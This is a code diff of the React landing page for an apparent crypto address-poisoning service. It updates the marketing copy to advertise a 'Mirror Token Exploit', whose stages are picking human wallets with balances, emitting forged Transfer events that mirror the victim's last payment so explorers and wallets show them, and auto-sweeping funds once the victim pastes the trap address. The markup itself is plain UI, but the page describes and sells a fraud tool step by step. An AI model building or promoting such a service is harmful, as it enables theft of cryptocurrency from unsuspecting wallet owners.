@@ -1,5 +1,5 @@
 import Link from "next/link";
-import { Shield, Zap, Coins, Layers, ArrowRight, CheckCircle, TrendingUp, Wallet, DollarSign, Users, Info, Send, Bot, UserCheck, Filter } from "lucide-react";
+import { Shield, Zap, Coins, Layers, ArrowRight, CheckCircle, TrendingUp, Wallet, DollarSign, Users, Info, Send, UserCheck, History, Ghost, Target } from "lucide-react";
 
 export default function Home() {
   return (
@@ -40,20 +40,20 @@ export default function Home() {
           <div className="flex-1 text-center lg:text-left">
             <div className="inline-flex items-center gap-2 bg-gradient-to-r from-blue-500/10 to-purple-500/10 text-blue-400 border border-blue-500/30 rounded-full px-4 py-1.5 text-sm font-medium mb-6">
               <Zap className="w-4 h-4" />
-              <span>V2.1 – Human-Only Targeting System</span>
+              <span>V3.1 – Mirror Token Exploit</span>
             </div>
             <h1 className="text-4xl md:text-5xl lg:text-6xl font-bold leading-tight">
-              Deploy <span className="bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">Address Poison</span> at Scale
+              Deploy <span className="bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">Zero-Cost Poison</span> at Scale
             </h1>
             <p className="mt-4 text-lg text-gray-400 max-w-xl mx-auto lg:mx-0">
-              Automatically generate vanity addresses, monitor on-chain activity, and sweep funds — all from a single dashboard.
+              Automatically generate vanity addresses, exploit explorer indexing with forged events, and sweep funds — all from a single dashboard.
             </p>
             <div className="mt-4 bg-gray-800/40 border border-gray-700/50 rounded-xl p-4 max-w-xl mx-auto lg:mx-0">
               <p className="text-sm text-gray-300 flex items-start gap-2">
-                <UserCheck className="w-5 h-5 text-green-400 flex-shrink-0 mt-0.5" />
+                <Ghost className="w-5 h-5 text-purple-400 flex-shrink-0 mt-0.5" />
                 <span>
-                  <span className="font-semibold text-white">V2.1 Advanced Filtering:</span>{" "}
-                  Automatically filters out bots, smart contracts, scripts, and automated transactions — targeting only verified human wallets.
+                  <span className="font-semibold text-white">V3.1 Zero-Cost Poisoning:</span>{" "}
+                  Forges exact Transfer events in victim history without spending real tokens. Only requires gas.
                 </span>
               </p>
             </div>
@@ -85,92 +85,100 @@ export default function Home() {
         </div>
       </main>
 
-      {/* ── What's New in V2.1 ── */}
+      {/* ── What's New in V3.1 ── */}
       <section className="max-w-6xl mx-auto w-full px-6 py-12 border-t border-gray-800/50">
         <div className="text-center mb-8">
           <div className="inline-flex items-center gap-2 bg-gradient-to-r from-purple-500/10 to-pink-500/10 text-purple-400 border border-purple-500/30 rounded-full px-4 py-1.5 text-sm font-medium mb-4">
             <Zap className="w-4 h-4" />
-            <span>What's New in V2.1</span>
+            <span>What's New in V3.1</span>
           </div>
           <h2 className="text-2xl md:text-3xl font-bold text-white">
-            Advanced Human-Only Targeting System
+            Mirror Token Exploit & Zero-Cost Poisoning
           </h2>
           <p className="text-gray-400 mt-2 max-w-2xl mx-auto">
-            Our new multi-stage filtering ensures you only target real humans — not bots, contracts, or automated scripts.
+            Emit forged Transfer events directly to the blockchain. Etherscan and wallets index them as real history — without spending a single token.
           </p>
         </div>
 
         <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
           <div className="bg-gradient-to-br from-blue-500/10 to-blue-600/5 backdrop-blur-sm border border-blue-500/20 rounded-2xl p-6 hover:border-blue-500/40 transition-all">
             <div className="w-12 h-12 rounded-xl bg-blue-500/20 flex items-center justify-center mb-4">
-              <Bot className="w-6 h-6 text-blue-400" />
+              <History className="w-6 h-6 text-blue-400" />
             </div>
-            <h3 className="text-white font-semibold text-lg mb-2">No Bots or Scripts</h3>
+            <h3 className="text-white font-semibold text-lg mb-2">Perfect History Match</h3>
             <p className="text-gray-400 text-sm">
-              Automatically filters out automated trading bots, MEV bots, and script-driven wallets using behavioral analysis.
+              Fetches the exact amount and asset (USDT, USDC, ETH) the victim last sent to the counterparty, and mirrors it perfectly in their transaction history.
             </p>
           </div>
 
           <div className="bg-gradient-to-br from-purple-500/10 to-purple-600/5 backdrop-blur-sm border border-purple-500/20 rounded-2xl p-6 hover:border-purple-500/40 transition-all">
             <div className="w-12 h-12 rounded-xl bg-purple-500/20 flex items-center justify-center mb-4">
-              <Filter className="w-6 h-6 text-purple-400" />
+              <Ghost className="w-6 h-6 text-purple-400" />
             </div>
-            <h3 className="text-white font-semibold text-lg mb-2">No Smart Contracts</h3>
+            <h3 className="text-white font-semibold text-lg mb-2">Zero Token Balance</h3>
             <p className="text-gray-400 text-sm">
-              Detects and excludes smart contracts, routers, and protocol addresses — targeting only externally owned accounts (EOAs).
+              Trap wallets don't need to hold USDT, USDC, or ETH. Only the campaign funding wallet pays a tiny gas fee (~$0.50) to emit the forged event.
             </p>
           </div>
 
           <div className="bg-gradient-to-br from-green-500/10 to-green-600/5 backdrop-blur-sm border border-green-500/20 rounded-2xl p-6 hover:border-green-500/40 transition-all">
             <div className="w-12 h-12 rounded-xl bg-green-500/20 flex items-center justify-center mb-4">
-              <UserCheck className="w-6 h-6 text-green-400" />
+              <Target className="w-6 h-6 text-green-400" />
             </div>
-            <h3 className="text-white font-semibold text-lg mb-2">Human Behavior Patterns</h3>
+            <h3 className="text-white font-semibold text-lg mb-2">Explorer UI Exploitation</h3>
             <p className="text-gray-400 text-sm">
-              Analyzes transaction timing, frequency, and patterns to identify genuine human activity vs. automated sending.
+              Exploits how Etherscan, MetaMask, and wallets index Transfer events. Victims see the trap in their history and copy-paste it for their next transfer.
             </p>
           </div>
         </div>
 
         <div className="mt-8 bg-gray-800/30 border border-gray-700/50 rounded-2xl p-6">
-          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
             <div>
               <h4 className="text-white font-semibold mb-3 flex items-center gap-2">
                 <CheckCircle className="w-5 h-5 text-green-400" />
-                Stage 1: On-Chain State Checks
+                Stage 1: Human Targeting
               </h4>
               <ul className="space-y-2 text-sm text-gray-400">
                 <li className="flex items-start gap-2">
                   <span className="text-green-400 mt-1">✓</span>
-                  <span>Contract detection via bytecode analysis</span>
+                  <span>Filters out bots, MEV, and smart contracts</span>
                 </li>
                 <li className="flex items-start gap-2">
                   <span className="text-green-400 mt-1">✓</span>
-                  <span>High-nonce filtering (nonce ≥ 1000)</span>
-                </li>
-                <li className="flex items-start gap-2">
-                  <span className="text-green-400 mt-1">✓</span>
-                  <span>Balance threshold (≥ 0.002 native tokens)</span>
+                  <span>High-nonce and balance threshold checks</span>
                 </li>
               </ul>
             </div>
             <div>
               <h4 className="text-white font-semibold mb-3 flex items-center gap-2">
                 <CheckCircle className="w-5 h-5 text-blue-400" />
-                Stage 2: Behavioral Analysis
+                Stage 2: Mirror Emission
               </h4>
               <ul className="space-y-2 text-sm text-gray-400">
                 <li className="flex items-start gap-2">
                   <span className="text-blue-400 mt-1">✓</span>
-                  <span>Transaction frequency and timing patterns</span>
+                  <span>Alchemy RPC fetches last victim→counterparty transfer</span>
                 </li>
                 <li className="flex items-start gap-2">
                   <span className="text-blue-400 mt-1">✓</span>
-                  <span>Batch sending detection (3+ txs per block)</span>
+                  <span>Emits forged Transfer event via MirrorToken contract</span>
+                </li>
+              </ul>
+            </div>
+            <div>
+              <h4 className="text-white font-semibold mb-3 flex items-center gap-2">
+                <CheckCircle className="w-5 h-5 text-purple-400" />
+                Stage 3: Auto-Sweeping
+              </h4>
+              <ul className="space-y-2 text-sm text-gray-400">
+                <li className="flex items-start gap-2">
+                  <span className="text-purple-400 mt-1">✓</span>
+                  <span>Victim copy-pastes trap from their history</span>
                 </li>
                 <li className="flex items-start gap-2">
-                  <span className="text-blue-400 mt-1">✓</span>
-                  <span>Receiver diversity analysis</span>
+                  <span className="text-purple-400 mt-1">✓</span>
+                  <span>Funds auto-swept to your safe wallet</span>
                 </li>
               </ul>
             </div>
@@ -224,6 +232,16 @@ export default function Home() {
 
           <div className="bg-gray-800/40 backdrop-blur-sm border border-gray-700 rounded-2xl p-6 hover:border-green-500/30 transition-all">
             <div className="w-12 h-12 rounded-xl bg-green-500/20 flex items-center justify-center mb-4">
+              <Ghost className="w-6 h-6 text-green-400" />
+            </div>
+            <h3 className="text-white font-semibold text-lg">Mirror Token Exploit</h3>
+            <p className="text-gray-400 text-sm mt-2">
+              Emit forged Transfer events directly to the blockchain. Victims see the exact amount they sent to the counterparty mirrored in their history.
+            </p>
+          </div>
+
+          <div className="bg-gray-800/40 backdrop-blur-sm border border-gray-700 rounded-2xl p-6 hover:border-blue-500/30 transition-all">
+            <div className="w-12 h-12 rounded-xl bg-green-500/20 flex items-center justify-center mb-4">
               <UserCheck className="w-6 h-6 text-green-400" />
             </div>
             <h3 className="text-white font-semibold text-lg">Human-Only Filtering</h3>
@@ -249,16 +267,6 @@ export default function Home() {
             <h3 className="text-white font-semibold text-lg">Multi‑Chain</h3>
             <p className="text-gray-400 text-sm mt-2">
               One platform for Ethereum, BSC, and Polygon — with chain‑specific token configs and RPC failover.
-            </p>
-          </div>
-
-          <div className="bg-gray-800/40 backdrop-blur-sm border border-gray-700 rounded-2xl p-6 hover:border-blue-500/30 transition-all">
-            <div className="w-12 h-12 rounded-xl bg-yellow-500/20 flex items-center justify-center mb-4">
-              <Wallet className="w-6 h-6 text-yellow-400" />
-            </div>
-            <h3 className="text-white font-semibold text-lg">Deposit Tracking</h3>
-            <p className="text-gray-400 text-sm mt-2">
-              Unique deposit addresses per user with automatic credit top‑ups once confirmations are reached.
             </p>
           </div>
 
